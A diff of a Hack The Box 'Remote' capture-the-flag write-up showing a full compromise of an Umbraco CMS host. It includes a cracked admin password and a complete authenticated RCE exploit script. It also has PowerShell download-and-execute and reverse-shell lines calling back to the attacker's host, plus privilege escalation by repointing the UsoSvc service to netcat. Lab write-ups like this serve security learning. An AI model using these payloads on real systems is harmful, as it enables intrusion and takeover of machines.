+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;SHA1&#34;</span><span style="color:#f92672">}</span>admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+</code></pre></div><p>Focus on the SHA1 because is easy to be cracked:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">b8be16afba8c314ad33d812f22a04991b90e2aaa
+</code></pre></div><p>Using <a href="https://md5decrypt.net">https://md5decrypt.net</a> because i am lazy.</p>
 <p>sha1 decoded is:</p>
-<pre><code>b8be16afba8c314ad33d812f22a04991b90e2aaa : baconandcheese
-</code></pre>
-<p>so it is:</p>
-<pre><code>admin@htb.local/baconandcheese
-</code></pre>
-<h3 id="testing-the-credentials">Testing the credentials</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">b8be16afba8c314ad33d812f22a04991b90e2aaa : baconandcheese
+</code></pre></div><p>so it is:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">admin@htb.local/baconandcheese
+</code></pre></div><h3 id="testing-the-credentials">Testing the credentials</h3>
 <p>Following the path inside the web backup there is a login page inside</p>
 <p><img src="/images/posts/htb_remote_umbraco.png" alt="alt text" title="Umbraco login"></p>
 <p>The credentials works:</p>
-<pre><code>admin@htb.local/baconandcheese
-</code></pre>
-<h2 id="3---exploit">3 - Exploit</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">admin@htb.local/baconandcheese
+</code></pre></div><h2 id="3---exploit">3 - Exploit</h2>
 <p>Using the exploit</p>
-<pre><code>searchsploit -m 46153
-  Exploit: Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit -m <span style="color:#ae81ff">46153</span>
+  Exploit: Umbraco CMS 7.12.4 - <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> Remote Code Execution
       URL: https://www.exploit-db.com/exploits/46153
      Path: /usr/share/exploitdb/exploits/aspx/webapps/46153.py
 File Type: Python script, ASCII text executable, with CRLF line terminators
 
-</code></pre><h3 id="custom-exploit">Custom exploit</h3>
+</code></pre></div><h3 id="custom-exploit">Custom exploit</h3>
 <p>It is a remote code execution so the goal is to execute a reverse shell this time i used <em>powercat</em>.</p>
 <p>The tactic it is to use powershell, with the following arguments to download powercat from my machine which has a python server serving powercat and then use it to connect to my machine on the port 1337</p>
-<pre><code>proc.StartInfo.FileName = &quot;powershell.exe&quot;; 
-proc.StartInfo.Arguments = &quot;IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/powercat.ps1');powercat -c 10.10.14.5 -p 1337 -e cmd&quot;;\
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">proc.StartInfo.FileName = <span style="color:#e6db74">&#34;powershell.exe&#34;</span>; 
+proc.StartInfo.Arguments = <span style="color:#e6db74">&#34;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://10.10.14.5/powercat.ps1&#39;);powercat -c 10.10.14.5 -p 1337 -e cmd&#34;</span>;\
 
-</code></pre><pre><code># Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
-# Dork: N/A
-# Date: 2019-01-13
-# Exploit Author: Gregory DRAPERI &amp; Hugo BOUTINON
-# Vendor Homepage: http://www.umbraco.com/
-# Software Link: https://our.umbraco.com/download/releases
-# Version: 7.12.4
-# Category: Webapps
-# Tested on: Windows IIS
-# CVE: N/A
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators</span>
+<span style="color:#75715e"># Dork: N/A</span>
+<span style="color:#75715e"># Date: 2019-01-13</span>
+<span style="color:#75715e"># Exploit Author: Gregory DRAPERI &amp; Hugo BOUTINON</span>
+<span style="color:#75715e"># Vendor Homepage: http://www.umbraco.com/</span>
+<span style="color:#75715e"># Software Link: https://our.umbraco.com/download/releases</span>
+<span style="color:#75715e"># Version: 7.12.4</span>
+<span style="color:#75715e"># Category: Webapps</span>
+<span style="color:#75715e"># Tested on: Windows IIS</span>
+<span style="color:#75715e"># CVE: N/A</span>
 
 
-import requests;
+<span style="color:#f92672">import</span> requests;
 
-from bs4 import BeautifulSoup;
+<span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup;
 
-def print_dict(dico):
-    print(dico.items());
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_dict</span>(dico):
+    <span style="color:#66d9ef">print</span>(dico<span style="color:#f92672">.</span>items());
     
-print(&quot;Start&quot;);
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Start&#34;</span>);
 
 
-# Execute a calc for the PoC
-payload = '''&lt;?xml version=&quot;1.0&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot; \
-xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; \
-xmlns:csharp_user=&quot;http://csharp.mycompany.com/mynamespace&quot;&gt;\
-&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;csharp_user&quot;&gt;public string xml() \
-{ string cmd = &quot;&quot;; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
- proc.StartInfo.FileName = &quot;powershell.exe&quot;; proc.StartInfo.Arguments = &quot;IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/powercat.ps1');powercat -c 10.10.14.5 -p 1337 -e cmd&quot;;\
- proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
- proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
- &lt;/msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;csharp_user:xml()&quot;/&gt;\
- &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; ''';
+<span style="color:#75715e"># Execute a calc for the PoC</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;&lt;?xml version=&#34;1.0&#34;?&gt;&lt;xsl:stylesheet version=&#34;1.0&#34; </span><span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span><span style="color:#e6db74">xmlns:xsl=&#34;http://www.w3.org/1999/XSL/Transform&#34; xmlns:msxsl=&#34;urn:schemas-microsoft-com:xslt&#34; </span><span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span><span style="color:#e6db74">xmlns:csharp_user=&#34;http://csharp.mycompany.com/mynamespace&#34;&gt;</span><span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span><span style="color:#e6db74">&lt;msxsl:script language=&#34;C#&#34; implements-prefix=&#34;csharp_user&#34;&gt;public string xml() </span><span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span><span style="color:#e6db74">{ string cmd = &#34;&#34;; System.Diagnostics.Process proc = new System.Diagnostics.Process();</span><span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span><span style="color:#e6db74"> proc.StartInfo.FileName = &#34;powershell.exe&#34;; proc.StartInfo.Arguments = &#34;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://10.10.14.5/powercat.ps1&#39;);powercat -c 10.10.14.5 -p 1337 -e cmd&#34;;</span><span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span><span style="color:#e6db74"> proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; </span><span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span><span style="color:#e6db74"> proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } </span><span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span><span style="color:#e6db74"> &lt;/msxsl:script&gt;&lt;xsl:template match=&#34;/&#34;&gt; &lt;xsl:value-of select=&#34;csharp_user:xml()&#34;/&gt;</span><span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span><span style="color:#e6db74"> &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; &#39;&#39;&#39;</span>;
 
-login = &quot;admin@htb.local&quot;;
-password=&quot;baconandcheese&quot;;
-host = &quot;http://10.10.10.180&quot;;
+login <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin@htb.local&#34;</span>;
+password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;baconandcheese&#34;</span>;
+host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://10.10.10.180&#34;</span>;
 
-# Step 1 - Get Main page
-s = requests.session()
-url_main =host+&quot;/umbraco/&quot;;
-r1 = s.get(url_main);
-print_dict(r1.cookies);
+<span style="color:#75715e"># Step 1 - Get Main page</span>
+s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+url_main <span style="color:#f92672">=</span>host<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/umbraco/&#34;</span>;
+r1 <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url_main);
+print_dict(r1<span style="color:#f92672">.</span>cookies);
 
-# Step 2 - Process Login
-url_login = host+&quot;/umbraco/backoffice/UmbracoApi/Authentication/PostLogin&quot;;
-loginfo = {&quot;username&quot;:login,&quot;password&quot;:password};
-r2 = s.post(url_login,json=loginfo);
+<span style="color:#75715e"># Step 2 - Process Login</span>
+url_login <span style="color:#f92672">=</span> host<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/umbraco/backoffice/UmbracoApi/Authentication/PostLogin&#34;</span>;
+loginfo <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>:login,<span style="color:#e6db74">&#34;password&#34;</span>:password};
+r2 <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(url_login,json<span style="color:#f92672">=</span>loginfo);
 
-# Step 3 - Go to vulnerable web page
-url_xslt = host+&quot;/umbraco/developer/Xslt/xsltVisualize.aspx&quot;;
-r3 = s.get(url_xslt);
+<span style="color:#75715e"># Step 3 - Go to vulnerable web page</span>
+url_xslt <span style="color:#f92672">=</span> host<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/umbraco/developer/Xslt/xsltVisualize.aspx&#34;</span>;
+r3 <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url_xslt);
 
-soup = BeautifulSoup(r3.text, 'html.parser');
-VIEWSTATE = soup.find(id=&quot;__VIEWSTATE&quot;)['value'];
-VIEWSTATEGENERATOR = soup.find(id=&quot;__VIEWSTATEGENERATOR&quot;)['value'];
-UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
-headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
-data = {&quot;__EVENTTARGET&quot;:&quot;&quot;,&quot;__EVENTARGUMENT&quot;:&quot;&quot;,&quot;__VIEWSTATE&quot;:VIEWSTATE,&quot;__VIEWSTATEGENERATOR&quot;:VIEWSTATEGENERATOR,&quot;ctl00$body$xsltSelection&quot;:payload,&quot;ctl00$body$contentPicker$ContentIdValue&quot;:&quot;&quot;,&quot;ctl00$body$visualizeDo&quot;:&quot;Visualize+XSLT&quot;};
+soup <span style="color:#f92672">=</span> BeautifulSoup(r3<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#39;html.parser&#39;</span>);
+VIEWSTATE <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find(id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;__VIEWSTATE&#34;</span>)[<span style="color:#e6db74">&#39;value&#39;</span>];
+VIEWSTATEGENERATOR <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find(id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;__VIEWSTATEGENERATOR&#34;</span>)[<span style="color:#e6db74">&#39;value&#39;</span>];
+UMBXSRFTOKEN <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#39;UMB-XSRF-TOKEN&#39;</span>];
+headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;UMB-XSRF-TOKEN&#39;</span>:UMBXSRFTOKEN};
+data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;__EVENTTARGET&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;__EVENTARGUMENT&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;__VIEWSTATE&#34;</span>:VIEWSTATE,<span style="color:#e6db74">&#34;__VIEWSTATEGENERATOR&#34;</span>:VIEWSTATEGENERATOR,<span style="color:#e6db74">&#34;ctl00$body$xsltSelection&#34;</span>:payload,<span style="color:#e6db74">&#34;ctl00$body$contentPicker$ContentIdValue&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;ctl00$body$visualizeDo&#34;</span>:<span style="color:#e6db74">&#34;Visualize+XSLT&#34;</span>};
 
-# Step 4 - Launch the attack
-r4 = s.post(url_xslt,data=data,headers=headers);
+<span style="color:#75715e"># Step 4 - Launch the attack</span>
+r4 <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(url_xslt,data<span style="color:#f92672">=</span>data,headers<span style="color:#f92672">=</span>headers);
 
-print(&quot;End&quot;);
-</code></pre><h3 id="setting-up-listeners">Setting up listeners</h3>
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;End&#34;</span>);
+</code></pre></div><h3 id="setting-up-listeners">Setting up listeners</h3>
 <p>Using python with http.server on the port 80 (sudo required) to use the powershell <em>DownloadString</em></p>
-<pre><code>sudo python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.10.180 - - [28/Jul/2020 20:00:55] &quot;GET /powercat.ps1 HTTP/1.1&quot; 200 -
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo python3 -m http.server <span style="color:#ae81ff">80</span>
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+10.10.10.180 - - <span style="color:#f92672">[</span>28/Jul/2020 20:00:55<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /powercat.ps1 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
 
-</code></pre><p>And the nc listener:</p>
-<pre><code>nc -lvp 1337
-</code></pre>
-<h3 id="using-the-exploit-and-user-flag">Using the exploit and user flag</h3>
-<pre><code>python exploit.py
-</code></pre>
-<p>The reverse shell sucess with the user REMOTE</p>
+</code></pre></div><p>And the nc listener:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvp <span style="color:#ae81ff">1337</span>
+</code></pre></div><h3 id="using-the-exploit-and-user-flag">Using the exploit and user flag</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python exploit.py
+</code></pre></div><p>The reverse shell sucess with the user REMOTE</p>
 <p>Inside the path c:\Users\Public the user flag is available:</p>
-<pre><code class="language-c:\Users\Public>type" data-lang="c:\Users\Public>type">type user.txt
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">c:\Users\Public&gt;type user.txt
+type user.txt
 31****************4e
-</code></pre><h2 id="4---post-exploitation-privilege-scalation">4 - Post-Exploitation privilege scalation</h2>
+</code></pre></div><h2 id="4---post-exploitation-privilege-scalation">4 - Post-Exploitation privilege scalation</h2>
 <p>Now the mission is to get admin priveleges, to do that it is necesary to enumarate more. After a lot of research i will post only the found vector</p>
-<pre><code>c:\inetpub&gt;net user
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">c:\inetpub&gt;net user
 net user
 
-User accounts for \\
+User accounts <span style="color:#66d9ef">for</span> \\
 
 -------------------------------------------------------------------------------
 Administrator            DefaultAccount           Guest                    
 WDAGUtilityAccount       
 The command completed with one or more errors.
-</code></pre><h3 id="powerup">powerup</h3>
+</code></pre></div><h3 id="powerup">powerup</h3>
 <p>With powershell, download the powerup script from my machine with python server listening to enumerate the machine</p>
-<pre><code>c:\Users\Public\Documents&gt;powershell
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">c:\Users\Public\Documents&gt;powershell
 powershell
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
-PS C:\Users\Public\Documents&gt; IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/powerup.ps1')
-IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/powerup.ps1')
+PS C:\Users\Public\Documents&gt; IEX(New-Object Net.WebClient).downloadString(<span style="color:#e6db74">&#39;http://10.10.14.5/powerup.ps1&#39;</span>)
+IEX(New-Object Net.WebClient).downloadString(<span style="color:#e6db74">&#39;http://10.10.14.5/powerup.ps1&#39;</span>)
 PS C:\Users\Public\Documents&gt; Invoke-AllChecks
 Invoke-AllChecks
 
 [*] Running Invoke-AllChecks
-[*] Checking if user is in a local group with administrative privileges...
-[*] Checking for unquoted service paths...
+[*] Checking <span style="color:#66d9ef">if</span> user is <span style="color:#66d9ef">in</span> a local group with administrative privileges...
+[*] Checking <span style="color:#66d9ef">for</span> unquoted service paths...
 [*] Checking service executable and argument permissions...
 [*] Checking service permissions...
 
-ServiceName   : UsoSvc
-Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
-StartName     : LocalSystem
-AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
-CanRestart    : True
+ServiceName   <span style="color:#960050;background-color:#1e0010">:</span> UsoSvc
+Path          <span style="color:#960050;background-color:#1e0010">:</span> C:\Windows\system32\svchost.exe -k netsvcs -p
+StartName     <span style="color:#960050;background-color:#1e0010">:</span> LocalSystem
+AbuseFunction <span style="color:#960050;background-color:#1e0010">:</span> Invoke-ServiceAbuse -Name <span style="color:#e6db74">&#39;UsoSvc&#39;</span>
+CanRestart    <span style="color:#960050;background-color:#1e0010">:</span> True
 
-[*] Checking %PATH% for potentially hijackable DLL locations...
-[*] Checking for AlwaysInstallElevated registry key...Test-Path : Access is denied
-At line:856 char:46
-+ ...                  if($ParentPath -and (Test-Path -Path $ParentPath)) {
+[*] Checking <span style="color:#66d9ef">%</span>PATH% <span style="color:#66d9ef">for</span> potentially hijackable DLL locations...
+[*] Checking <span style="color:#66d9ef">for</span> AlwaysInstallElevated registry key...Test-Path <span style="color:#960050;background-color:#1e0010">:</span> Access is denied
+At line<span style="color:#960050;background-color:#1e0010">:</span>856 char<span style="color:#960050;background-color:#1e0010">:</span>46
++ ...                  <span style="color:#66d9ef">if</span>($ParentPath <span style="color:#f92672">-and</span> (Test-Path -Path $ParentPath)) {
 +                                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : PermissionDenied: (C:\Windows\syst...Local\Microsoft:String) [Test-Path], UnauthorizedAc 
+    + CategoryInfo          <span style="color:#960050;background-color:#1e0010">:</span> PermissionDenied<span style="color:#960050;background-color:#1e0010">:</span> (C:\Windows\syst...Local\Microsoft<span style="color:#960050;background-color:#1e0010">:</span>String) [Test-Path], UnauthorizedAc 
    cessException
-    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.TestPathCommand
-[*] Checking for Autologon credentials in registry...
-[*] Checking for modifidable registry autoruns and configs...
-[*] Checking for modifiable schtask files/configs...
-[*] Checking for unattended install files...
-UnattendPath : C:\Windows\Panther\Unattend.xml
-[*] Checking for encrypted web.config strings...
-[*] Checking for encrypted application pool and virtual directory passwords...
-[*] Checking for plaintext passwords in McAfee SiteList.xml files....
-[*] Checking for cached Group Policy Preferences .xml files....
-</code></pre><p>So there is a service that can be exploitted:</p>
+    + FullyQualifiedErrorId <span style="color:#960050;background-color:#1e0010">:</span> ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.TestPathCommand
+[*] Checking <span style="color:#66d9ef">for</span> Autologon credentials <span style="color:#66d9ef">in</span> registry...
+[*] Checking <span style="color:#66d9ef">for</span> modifidable registry autoruns and configs...
+[*] Checking <span style="color:#66d9ef">for</span> modifiable schtask files/configs...
+[*] Checking <span style="color:#66d9ef">for</span> unattended install files...
+UnattendPath <span style="color:#960050;background-color:#1e0010">:</span> C:\Windows\Panther\Unattend.xml
+[*] Checking <span style="color:#66d9ef">for</span> encrypted web.config strings...
+[*] Checking <span style="color:#66d9ef">for</span> encrypted application pool and virtual directory passwords...
+[*] Checking <span style="color:#66d9ef">for</span> plaintext passwords <span style="color:#66d9ef">in</span> McAfee SiteList.xml files....
+[*] Checking <span style="color:#66d9ef">for</span> cached Group Policy Preferences .xml files....
+</code></pre></div><p>So there is a service that can be exploitted:</p>
 <p><em>Invoke-ServiceAbuse -Name &lsquo;UsoSvc&rsquo;</em> the idea is to use the service to spawn a reverse shell to my machine.</p>
 <h3 id="using-usosvc">Using UsoSvc</h3>
 <p>Downloading a nc to generate another reverse shell</p>
-<pre><code>Invoke-WebRequest 10.10.14.5:80/nc64.exe -UseBasicParsing -OutFile nc.exe
-</code></pre>
-<pre><code>PS C:\Users\Public\Documents&gt; Invoke-ServiceAbuse -Name 'UsoSvc' -Command &quot;C:\Users\Public\Documents\nc.exe 10.10.14.5 1338 -e cmd.exe&quot;
-Invoke-ServiceAbuse -Name 'UsoSvc' -Command &quot;C:\Users\Public\Documents\nc.exe 10.10.14.5 1338 -e cmd.exe&quot;
-</code></pre><p>it does not work as expected using these paths&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-WebRequest 10.10.14.5<span style="color:#960050;background-color:#1e0010">:</span>80/nc64.exe -UseBasicParsing -OutFile nc.exe
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\Public\Documents&gt; Invoke-ServiceAbuse -Name <span style="color:#e6db74">&#39;UsoSvc&#39;</span> -Command <span style="color:#e6db74">&#34;C:\Users\Public\Documents\nc.exe 10.10.14.5 1338 -e cmd.exe&#34;</span>
+Invoke-ServiceAbuse -Name <span style="color:#e6db74">&#39;UsoSvc&#39;</span> -Command <span style="color:#e6db74">&#34;C:\Users\Public\Documents\nc.exe 10.10.14.5 1338 -e cmd.exe&#34;</span>
+</code></pre></div><p>it does not work as expected using these paths&hellip;</p>
 <p>Changing port, using another path and setting that path as binpath to execute nc and configuring the service to use the nc.exe downloaded:</p>
-<pre><code>sc.exe config usosvc binPath=&quot;C:\Windows\Temp\nc.exe 10.10.14.5 9987 -e powershell.exe&quot;
-[SC] ChangeServiceConfig SUCCESS
-</code></pre><p>Stopping the service to force a new startup execution of the service</p>
-<pre><code>PS C:\Users\Public\Documents&gt; sc.exe stop usosvc
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">sc.exe config usosvc binPath=<span style="color:#e6db74">&#34;C:\Windows\Temp\nc.exe 10.10.14.5 9987 -e powershell.exe&#34;</span>
+<span style="color:#66d9ef">[SC]</span> ChangeServiceConfig SUCCESS
+</code></pre></div><p>Stopping the service to force a new startup execution of the service</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\Public\Documents&gt; sc.exe stop usosvc
 
 
-SERVICE_NAME: usosvc 
-        TYPE               : 30  WIN32  
-        STATE              : 3  STOP_PENDING 
+SERVICE_NAME<span style="color:#960050;background-color:#1e0010">:</span> usosvc 
+        TYPE               <span style="color:#960050;background-color:#1e0010">:</span> 30  WIN32  
+        STATE              <span style="color:#960050;background-color:#1e0010">:</span> 3  STOP_PENDING 
                                 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
-        CHECKPOINT         : 0x3
-        WAIT_HINT          : 0x7530
-</code></pre><h3 id="setting-up-a-listener">Setting up a listener</h3>
-<pre><code>rlwrap nc -nvlp 9987
-listening on [any] 9987 ...
-</code></pre><h3 id="start-the-service-and-reverse-shell">Start the service and reverse shell</h3>
-<pre><code>PS C:\Users\Public\Documents&gt; sc.exe start usosvc
+        WIN32_EXIT_CODE    <span style="color:#960050;background-color:#1e0010">:</span> 0  (0x0)
+        SERVICE_EXIT_CODE  <span style="color:#960050;background-color:#1e0010">:</span> 0  (0x0)
+        CHECKPOINT         <span style="color:#960050;background-color:#1e0010">:</span> 0x3
+        WAIT_HINT          <span style="color:#960050;background-color:#1e0010">:</span> 0x7530
+</code></pre></div><h3 id="setting-up-a-listener">Setting up a listener</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rlwrap nc -nvlp <span style="color:#ae81ff">9987</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9987</span> ...
+</code></pre></div><h3 id="start-the-service-and-reverse-shell">Start the service and reverse shell</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\Public\Documents&gt; sc.exe start usosvc
 sc.exe start usosvc
-[SC] StartService FAILED 1053:
+<span style="color:#66d9ef">[SC]</span> StartService FAILED 1053<span style="color:#960050;background-color:#1e0010">:</span>
 
-The service did not respond to the start or control request in a timely fashion.
-</code></pre><p>Seens to have fail but&hellip;</p>
-<pre><code>connect to [10.10.14.5] from (UNKNOWN) [10.10.10.180] 49865
+The service did not respond to the start or control request <span style="color:#66d9ef">in</span> a timely fashion.
+</code></pre></div><p>Seens to have fail but&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">connect to [10.10.14.5] from (UNKNOWN) [10.10.10.180] 49865
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
 PS C:\Windows\system32&gt; type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
 c81***************024
-</code></pre><p>Thanks for reading !</p>
+</code></pre></div><p>Thanks for reading !</p>
 </div>
 
   </article>
